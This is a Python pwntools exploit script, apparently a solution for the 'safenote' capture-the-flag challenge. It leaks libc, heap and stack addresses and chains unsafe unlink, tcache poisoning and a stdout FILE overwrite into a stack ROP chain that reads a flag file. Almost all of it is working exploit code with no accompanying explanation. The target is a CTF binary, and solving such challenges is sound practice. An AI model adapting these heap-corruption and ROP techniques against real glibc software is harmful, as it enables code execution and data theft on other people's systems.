#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP                         
# =========================================================
exe = './safenote_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "pwn.blitzhack.xyz", 9088

gdbscript = '''
init-pwndbg
b *open+130
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 9008)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./safenote"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='safenote')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(idx, size):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b': ', str(size).encode())

def show(idx):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', str(idx).encode())
    io.recvuntil(b"Data: ")

def edit(idx, content):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendafter(b': ', content)

def free(idx):
    io.sendlineafter(b': ', b'4')
    io.sendlineafter(b': ', str(idx).encode())

def stdout_leak(target=None, size=0x8):
    if target:
        return p64(0xfbad1800) + p64(0) * 3 + p64(target) + p64(target + size)
    else:
        return p64(0xfbad1800) + p64(0) * 3 + b'\x00'

def exploit():
    global io
    io = initialize()
    with log.progress("Leak libc & heap"):
        alloc(0, 0x98)
        show(0) # Leak libc
        libc_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
        libc.address = libc_leak - 0x1eccc0
        alloc(1, 0x48)
        alloc(2, 0x18)
        alloc(3, 0x18)
        show(3) # Leak heap
        heap = (u64(io.recvline().strip().ljust(8, b"\x00")) & ~0xfff) - 0x2000
    log.info(f"Libc leak: %#x", libc_leak)
    log.info(f"Libc base: %#x", libc.address)
    log.info(f"Heap base: %#x", heap)
    holder_addr = heap + 0x30d0
    victim_chunk_addr = heap + 0x31a0
    fake_fd = holder_addr - 0x18
    fake_bk = holder_addr - 0x10
    log.info("Holder addr: %#x", holder_addr)
    log.info("Victim chunk addr: %#x", victim_chunk_addr)
    log.info("Fake fd: %#x", fake_fd)
    log.info("Fake bk: %#x", fake_bk)

    with log.progress("Unsafe Unlink"), context.silent:
        alloc(4, 0xf8)
        alloc(5, 0xf8) # Target
        edit(4, p64(0) + p64(0xf0) + p64(fake_fd) + p64(fake_bk) + b'\x00' * 0xd0 + p64(0xf0)) #Fake chunk
        edit(2, p64(victim_chunk_addr))
        for i in range(6, 6+7): # Prepare tcache
            alloc(i, 0xf8)
        for i in reversed(range(6, 6+7)): # Fill tcache
            free(i)
        free(5) # Free victim chunk to unsorted bins
    
    with log.progress("Tcache poisoning"):
        alloc(6, 0x108)
        alloc(7, 0x108)
        free(7)
        free(6)
        edit(4, p64(0) + p64(0x111) + p64(libc.sym['_IO_2_1_stdout_'])) #Fake chunk
        alloc(6, 0x108)
        alloc(7, 0x108)
        edit(7, stdout_leak(libc.sym["environ"])) # leak stack via environ
        stack = u64(io.recvline().strip())
        ret = stack - 0x170
        edit(3, b"/home/pwn/flag.txt") #heap + 0x1e00

        alloc(8, 0x108)
        free(8)
        free(6) # Free previous tcache
        edit(4, p64(0) + p64(0x111) + p64(ret)) #To stack
        alloc(6, 0x108)
        alloc(8, 0x108)
    log.info(f"Stack leak: %#x", stack)
    log.info(f"Return address: %#x", ret)
    with log.progress("Overwrite the stack by close 0 then ROP ORW"):
        # Close then ORW
        rop = ROP(libc)
        syscall = rop.find_gadget(['syscall', 'ret'])[0]
        rop.raw(rop.ret.address)  # Align stack
        rop.close(0)
        rop.rax = constants.SYS_open
        rop.call(syscall, [heap + 0x1e00, 0])
        rop.read(0, heap, 0x50)
        rop.write(1, heap, 0x50)
        edit(8, rop.chain())

    io.interactive()

if __name__ == '__main__':
    exploit()